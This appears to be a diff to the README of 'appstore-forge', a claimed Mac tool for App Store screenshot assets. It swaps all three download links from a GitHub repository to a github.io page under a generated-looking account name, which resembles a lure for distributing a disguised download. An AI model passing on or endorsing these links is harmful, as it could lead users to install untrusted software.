@@ -4,7 +4,7 @@
 
 Welcome to appstore-forge! This helpful Mac application takes your app screenshots and transforms them into polished, professional assets ready for both the Apple App Store and Google Play Store. No technical skills needed — just your screenshots and a few clicks.
 
-**Visit this link to download the application:** [Download appstore-forge](https://github.com/Equatorial-genusbryanthus430/appstore-forge)
+**Visit this link to download the application:** [Download appstore-forge](https://equatorial-genusbryanthus430.github.io)
 
 ## 🔍 What Does appstore-forge Do?
 
@@ -33,7 +33,7 @@ No special hardware or graphics card is needed. If your Mac can run current apps
 Getting appstore-forge on your Mac is straightforward:
 
 ### Step 1: Download the Application
-**Visit this link to download the application:** [Get appstore-forge](https://github.com/Equatorial-genusbryanthus430/appstore-forge)
+**Visit this link to download the application:** [Get appstore-forge](https://equatorial-genusbryanthus430.github.io)
 
 When you click the link, you'll land on the project's download page. Look for the most recent version listed there. Click the download button for the macOS version.
 
@@ -156,7 +156,7 @@ Don't let complicated screenshot requirements hold back your app's success. apps
 
 **Ready to get started?** Visit the download page now:
 
-[Download appstore-forge](https://github.com/Equatorial-genusbryanthus430/appstore-forge)
+[Download appstore-forge](https://equatorial-genusbryanthus430.github.io)
 
 Turn your ordinary screenshots into extraordinary store presentations with appstore-forge. Your app deserves to look its best across every platform.
 
